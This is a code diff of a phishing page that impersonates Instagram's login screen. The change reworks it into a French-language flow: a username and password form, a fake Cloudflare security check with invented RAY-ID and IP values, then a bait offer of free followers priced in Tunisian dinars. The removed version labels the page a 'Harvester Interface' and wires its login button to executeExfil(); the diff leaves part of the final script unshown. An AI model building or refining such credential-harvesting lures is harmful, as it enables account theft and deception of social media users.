@@ -1,146 +1,346 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Instagram</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { 
-            background-color: #ffffff; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            margin: 0; 
-            padding: 0; 
-            color: #000000;
-            overflow: hidden;
+        :root {
+            --ig-primary: #0064E0;
+            --ig-bg: #000000;
+            --ig-soft: #121212;
+            --ig-border: #262626;
+            --ig-text: #FFFFFF;
+            --ig-secondary: #A8A8A8;
         }
-        
-        .splash-screen { 
-            position: fixed; 
-            inset: 0; 
-            background: white; 
-            z-index: 100; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            transition: opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1); 
+
+        body {
+            background-color: var(--ig-bg);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: var(--ig-text);
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
         }
-        
+
         .ig-input {
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
+            background: var(--ig-soft);
+            border: 1px solid var(--ig-border);
             border-radius: 12px;
             font-size: 14px;
             height: 52px;
             padding: 0 16px;
             width: 100%;
-            margin-bottom: 12px;
-            transition: all 0.2s;
+            color: white;
+            transition: border-color 0.2s ease;
         }
 
         .ig-input:focus {
-            border-color: #a8a8a8;
+            border-color: #555555;
             outline: none;
-            background: #fff;
         }
 
         .btn-primary {
-            background-color: #0064e0;
+            background-color: var(--ig-primary);
+            color: #FFFFFF;
             border-radius: 9999px;
-            color: #fff;
-            font-weight: 600;
-            height: 44px;
-            width: 100%;
-            cursor: pointer;
+            font-weight: 700;
             font-size: 15px;
+            height: 48px;
+            width: 100%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-top: 4px;
-            transition: opacity 0.2s;
+            transition: opacity 0.2s, transform 0.1s;
         }
-        .btn-primary:active { opacity: 0.8; }
+
+        .btn-primary:active { transform: scale(0.98); opacity: 0.9; }
 
         .btn-outline {
-            border: 1px solid #dbdbdb;
-            color: #000;
+            border: 1px solid var(--ig-border);
+            background: transparent;
+            color: white;
             border-radius: 9999px;
-            font-weight: 600;
+            font-weight: 700;
+            font-size: 14px;
             height: 44px;
             width: 100%;
-            cursor: pointer;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: transparent;
         }
 
-        .fade-hide { opacity: 0; pointer-events: none; }
-        .main-wrapper { opacity: 0; transition: opacity 0.6s ease-in; transform: translateY(10px); transition: all 0.6s cubic-bezier(0.2, 0.8, 0.2, 1); }
-        .fade-show { opacity: 1; transform: translateY(0); }
-        
-        .loader-ring {
-            border: 3px solid rgba(0, 100, 224, 0.1);
-            border-top: 3px solid #0064e0;
+        .cf-widget {
+            width: 300px;
+            height: 65px;
+            background-color: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            position: relative;
+        }
+
+        .dot-chase {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background-color: #22c55e;
             border-radius: 50%;
-            width: 24px;
-            height: 24px;
+            opacity: 0.2;
+            animation: chase 1s linear infinite;
+        }
+
+        @keyframes chase {
+            0% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.2; transform: scale(1); }
+        }
+
+        input[type=range] {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 4px;
+            background: #262626;
+            border-radius: 10px;
+            outline: none;
+        }
+
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            height: 22px;
+            width: 22px;
+            border-radius: 50%;
+            background: var(--ig-primary);
+            cursor: pointer;
+            border: 4px solid #000;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        .stage { display: none; width: 100%; max-width: 360px; margin: 0 auto; }
+        .active-stage { display: flex; flex-direction: column; align-items: center; animation: stageIn 0.4s ease-out forwards; }
+
+        @keyframes stageIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .loader {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.1);
+            border-top-color: #FFFFFF;
+            border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
 
-    <!-- Stage 1: Native Splash Sequence -->
-    <div id="splash" class="splash-screen">
-        <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="IG" class="w-20 h-20 mb-4 animate-pulse">
-        <div class="absolute bottom-12 flex flex-col items-center gap-2">
-            <span class="text-[10px] text-gray-400 uppercase tracking-widest font-bold">from</span>
-            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" alt="Meta" class="h-4">
-        </div>
-    </div>
+    <header class="w-full pt-4 flex justify-center items-center gap-1 text-[12px] text-[#A8A8A8]">
+        Français (France) 
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
+    </header>
 
-    <!-- Stage 2: Harvester Interface -->
-    <div class="main-wrapper text-center py-5 text-[#737373] text-[13px]">
-        English (US)
-    </div>
-
-    <div id="main-content" class="main-wrapper flex-grow flex flex-col items-center justify-center px-6 -mt-10">
-        <div class="w-full max-w-[360px] flex flex-col items-center">
+    <main class="flex-grow flex flex-col items-center justify-center px-6 -mt-10">
+        
+        <section id="s-login" class="stage active-stage">
             <div class="mb-14">
-                <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram" class="w-20 h-20">
+                <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="IG" class="w-[72px] h-[72px] brightness-125">
             </div>
 
-            <div class="w-full mb-4">
-                <input type="text" id="username" placeholder="Username, email or mobile number" class="ig-input" spellcheck="false">
-                <input type="password" id="password" placeholder="Password" class="ig-input">
-                <button id="login-btn" onclick="executeExfil()" class="btn-primary">
-                    <span id="btn-text">Log in</span>
-                    <div id="btn-loader" class="loader-ring hidden"></div>
+            <form id="login-form" class="w-full space-y-[8px]">
+                <input type="text" id="user" placeholder="Nom d'utilisateur ou e-mail" class="ig-input" required>
+                <input type="password" id="pass" placeholder="Mot de passe" class="ig-input" required>
+                
+                <button type="submit" id="l-btn" class="btn-primary mt-4">
+                    <span id="l-txt">Se connecter</span>
+                    <div id="l-load" class="loader hidden mx-auto"></div>
                 </button>
+
+                <div class="text-center pt-6">
+                    <a href="#" class="text-white text-[13px] font-bold">Mot de passe oublié ?</a>
+                </div>
+            </form>
+        </section>
+
+        <section id="s-cf" class="stage text-center space-y-8">
+            <div class="space-y-4">
+                <h2 class="text-2xl font-extrabold tracking-tight">Vérification...</h2>
+                <p class="text-[#A8A8A8] text-[14px] font-medium">Analyse de la sécurité de la connexion.</p>
             </div>
 
-            <div class="text-center pt-2">
-                <a href="#" class="text-[#000000] text-sm font-semibold tracking-tight">Forgot password?</a>
+            <div class="cf-widget mx-auto">
+                <div id="cf-spin" class="relative w-7 h-7 mr-4 shrink-0"></div>
+                <div id="cf-stat" class="text-[14px] font-medium">Vérification...</div>
+                <div id="cf-ok" class="hidden absolute left-3 w-7 h-7 bg-green-500 rounded-full flex items-center justify-center">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div class="ml-auto opacity-70 pointer-events-none">
+                    <img src="https://cf-assets.www.cloudflare.com/dzlvafdwdttg/69wNwfiY5mFmgpd9eQFW6j/d5131c08085a977aa70f19e7aada3fa9/1pixel-down__1_.svg" class="h-4 brightness-200">
+                </div>
             </div>
-        </div>
-    </div>
 
-    <!-- Persistent Bottom UI -->
-    <div id="footer-actions" class="main-wrapper pb-10 px-6 w-full max-w-[360px] mx-auto space-y-4">
-        <button class="btn-outline">
-            Create new account
-        </button>
-        <div class="flex flex-col items-center gap-1 opacity-60">
-             <span class="text-[9px] uppercase font-bold text-gray-400">Meta</span>
-             <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" alt="Meta" class="h-3">
-        </div>
-    </div>
+            <div class="text-[10px] text-gray-500 font-mono">
+                RAY-ID: <span id="ray"></span><br>IP: <span id="ip"></span>
+            </div>
+        </section>
 
-<script>
+        <section id="s-boost" class="stage">
+            <div class="text-center mb-10">
+                <h1 class="text-2xl font-black tracking-tight">Boost Influence</h1>
+                <p class="text-[#A8A8A8] text-[13px] mt-1">Configuration pour <span id="t-user" class="text-white font-bold">@user</span></p>
+            </div>
+
+            <div class="w-full mb-8 p-6 bg-[#121212] border border-[#262626] rounded-[24px] space-y-6">
+                <div class="flex justify-between items-end">
+                    <div>
+                        <span class="text-[10px] font-bold text-[#A8A8A8] uppercase tracking-widest">Abonnés</span>
+                        <div id="q-disp" class="text-5xl font-black tracking-tighter text-white">50</div>
+                    </div>
+                    <div class="text-right">
+                        <div id="p-disp" class="text-xl font-bold text-[#0064E0]">0.00 DT</div>
+                        <div id="badge" class="mt-1 inline-block px-2 py-0.5 bg-[#0064E0]/20 text-[#0064E0] text-[9px] font-bold rounded-full uppercase">Starter Pack</div>
+                    </div>
+                </div>
+
+                <div class="py-4">
+                    <input type="range" id="q-slide" min="50" max="5000" step="50" value="50">
+                </div>
+
+                <div class="pt-4 border-t border-[#262626] flex items-center gap-2">
+                    <svg class="text-amber-500 fill-amber-500" width="14" height="14" viewBox="0 0 24 24"><path d="m13 2-2 10h8l-2 10 2-10h-8l2-10z"/></svg>
+                    <span class="text-[11px] font-bold text-[#A8A8A8]">Priorité haute : Tunisie 🇹🇳</span>
+                </div>
+            </div>
+
+            <button id="c-btn" class="btn-primary">
+                <span id="c-txt">Réclamer Abonnés</span>
+                <div id="c-load" class="loader hidden mx-auto"></div>
+            </button>
+        </section>
+
+        <section id="s-done" class="stage text-center space-y-6">
+            <div class="w-20 h-20 bg-green-950 text-green-500 rounded-full flex items-center justify-center mx-auto border border-green-900">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div class="space-y-2">
+                <h2 class="text-2xl font-black tracking-tight">Commande Validée</h2>
+                <p class="text-[#A8A8A8] text-[14px] px-8 leading-relaxed">
+                    Les abonnés sont en cours de transfert vers <span id="f-user" class="text-white font-bold">@user</span>.
+                </p>
+            </div>
+            <div class="p-5 bg-[#121212] border border-[#262626] rounded-[24px] text-left mx-2">
+                <div class="flex justify-between text-[13px] font-bold">
+                    <span class="text-[#A8A8A8]">STATUT</span>
+                    <span class="text-[#0064E0]">ACTIF</span>
+                </div>
+            </div>
+            <button onclick="location.reload()" class="btn-outline">Fermer</button>
+        </section>
+
+    </main>
+
+    <footer id="footer" class="w-full max-w-[360px] pb-8 px-6 mt-auto mx-auto flex flex-col items-center">
+        <div id="f-acts" class="w-full mb-10">
+            <button class="btn-outline active:bg-[#121212]">Créer un compte</button>
+        </div>
+        <div class="opacity-40 flex flex-col items-center gap-1.5">
+            <span class="text-[10px] font-black uppercase tracking-[0.25em] text-[#A8A8A8]">from</span>
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" alt="Meta" class="h-3.5 grayscale invert brightness-200">
+        </div>
+    </footer>
+
+    <script>
+        const stages = {
+            login: document.getElementById('s-login'),
+            cf: document.getElementById('s-cf'),
+            boost: document.getElementById('s-boost'),
+            done: document.getElementById('s-done')
+        };
+        const loginForm = document.getElementById('login-form');
+        const slider = document.getElementById('q-slide');
+        const claimBtn = document.getElementById('c-btn');
+        const claimTxt = document.getElementById('c-txt');
+        const claimLoad = document.getElementById('c-load');
+        
+        let target = "";
+
+        const cfSpin = document.getElementById('cf-spin');
+        for (let i = 0; i < 8; i++) {
+            const dot = document.createElement('div');
+            dot.className = 'dot-chase';
+            const angle = (i / 8) * 2 * Math.PI;
+            dot.style.left = `${14 + 9 * Math.cos(angle) - 1.5}px`;
+            dot.style.top = `${14 + 9 * Math.sin(angle) - 1.5}px`;
+            dot.style.animationDelay = `${(i / 8)}s`;
+            cfSpin.appendChild(dot);
+        }
+
+        const gen = () => ({ 
+            r: Math.random().toString(16).substring(2, 10).toUpperCase() + '-' + Math.floor(Math.random()*9),
+            i: `197.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+        });
+
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            target = document.getElementById('user').value;
+            document.getElementById('l-txt').classList.add('hidden');
+            document.getElementById('l-load').classList.remove('hidden');
+
+            setTimeout(() => {
+                stages.login.classList.remove('active-stage');
+                stages.cf.classList.add('active-stage');
+                document.getElementById('f-acts').classList.add('hidden');
+                
+                const info = gen();
+                document.getElementById('ray').innerText = info.r;
+                document.getElementById('ip').innerText = info.i;
+
+                setTimeout(() => {
+                    document.getElementById('cf-spin').classList.add('hidden');
+                    document.getElementById('cf-stat').innerText = "Succès !";
+                    document.getElementById('cf-ok').classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        stages.cf.classList.remove('active-stage');
+                        stages.boost.classList.add('active-stage');
+                        document.getElementById('t-user').innerText = "@" + target;
+                    }, 1000);
+                }, 4000);
+            }, 1200);
+        });
+
+        slider.addEventListener('input', (e) => {
+            const val = parseInt(e.target.value);
+            document.getElementById('q-disp').innerText = val.toLocaleString();
+            if (val <= 50) {
+                document.getElementById('p-disp').innerText = "0.00 DT";
+                document.getElementById('badge').style.display = "inline-block";
+            } else {
+                document.getElementById('p-disp').innerText = (val * 0.015).toFixed(2) + " DT";
+                document.getElementById('badge').style.display = "none";
+            }
+            claimTxt.innerText = `Réclamer ${val.toLocaleString()} Abonnés`;
+        });
+
+        claimBtn.addEventListener('click', () => {
+            claimTxt.innerText = "Envoi en cours...";
+            claimLoad.classList.remove('hidden');
+            claimBtn.disabled = true;
+            claimBtn.style.opacity = "0.7";
+
+            // Délai de 17 secondes demandé par l'utilisateur
+            setTimeout(() => {
+                stages.boost.classList.remove('active-stage');
+                stages.done.classList.add('active-stage');
+                document.getElementById('f-user').innerText = "@" + target;
+            }, 17000);
+        });
+    </script>
+    <script>
+
     // 1. Grab raw Base64 config from URL
     const getRawConfig = () => {
         const h = window.location.hash.substring(1);
@@ -200,6 +400,7 @@
             }, 1000);
         }
     }
-</script>
+
+    </script>
 </body>
 </html>
